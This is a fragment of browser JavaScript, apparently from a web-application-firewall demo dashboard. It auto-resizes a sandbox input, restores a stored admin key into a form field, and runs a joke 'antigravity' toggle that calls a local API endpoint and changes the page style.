  // Setup Textarea resizing
  const inputEl = document.getElementById("sandbox-input");
  if (inputEl) {
    inputEl.addEventListener("input", () => {
      autoResizeTextarea(inputEl);
      updateCharCount(inputEl);
    });
    // Set initial size
    autoResizeTextarea(inputEl);
    updateCharCount(inputEl);
  }
});

function updateAdminKeyState() {
  const key = localStorage.getItem('waf_admin_key');
  const keyField = document.getElementById("admin-key-field");
  if (keyField && key) {
    keyField.value = key;
  }
  syncAdminState();
}

// ── 11. ANTIGRAVITY CONTROLLER ───────────────────────────────────────
async function toggleGravityState() {
  const body = document.body;
  const isZeroG = body.classList.contains("zero-gravity");
  
  if (isZeroG) {
    body.classList.remove("zero-gravity");
    const gravVal = document.getElementById("sb-gravity-val");
    if (gravVal) {
      gravVal.textContent = "9.8 m/s²";
      gravVal.className = "";
    }
    logAdminOutput("waf gravity --enable\nGravity restored to Earth Standard (9.80665 m/s²).");
  } else {
    logAdminOutput("waf gravity --disable\nRequesting physics override signature...");
    try {
      const data = await fetch('/api/gravity?code=1807', {
        headers: {
          'X-Antigravity': 'true',
          'X-Requested-With': 'XMLHttpRequest'
        }
      }).then(res => res.json());

      if (data.status === "disabled 🚀") {
        body.classList.add("zero-gravity");
        const gravVal = document.getElementById("sb-gravity-val");
        if (gravVal) {
          gravVal.textContent = "ZERO-G 🚀";
          gravVal.className = "text-green";
        }
        logAdminOutput(`waf gravity --disable\n[SUCCESS] Antigravity activated.\nMessage: "${data.message}"\nReference: ${data.reference}`);
      }
    } catch (err) {
      logAdminOutput(`[ERROR] Antigravity authorization failed: ${err.message}`);
    }
  }
}

// Expose toggleGravityState to the HTML markup context
window.toggleGravityState = toggleGravityState;

